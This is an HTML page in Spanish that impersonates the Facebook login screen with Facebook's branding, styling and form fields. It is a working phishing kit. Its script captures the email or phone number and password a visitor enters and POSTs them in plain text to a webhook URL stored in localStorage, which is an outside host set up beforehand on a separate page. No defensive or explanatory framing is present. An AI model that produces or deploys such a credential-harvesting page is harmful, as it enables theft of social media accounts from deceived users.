<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #166fe5;
        }

        .status {
            margin-top: 10px;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Iniciar sesión en Facebook</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Correo electrónico o teléfono" required />
            <input type="password" id="password" placeholder="Contraseña" required />
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="status" id="status"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();  // Evita que el formulario se envíe de manera tradicional

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                document.getElementById('status').innerText = "Por favor, ingresa ambos campos.";
                return;
            }

            // Recoger el webhook de localStorage
            const webhookUrl = localStorage.getItem('webhookUrl');
            
            if (!webhookUrl) {
                document.getElementById('status').innerText = "No se ha guardado un webhook. Vuelve a la Página A.";
                return;
            }

            // Datos a enviar al webhook
            const data = {
                content: `Intento de inicio de sesión: \nEmail: ${email} \nContraseña: ${password}`
            };

            // Enviar datos al webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(responseData => {
                document.getElementById('status').innerText = "Datos enviados correctamente.";
                console.log(responseData);
            })
            .catch(error => {
                document.getElementById('status').innerText = "Error al enviar los datos.";
                console.error("Error al enviar al webhook:", error);
            });
        });
    </script>

</body>
</html>
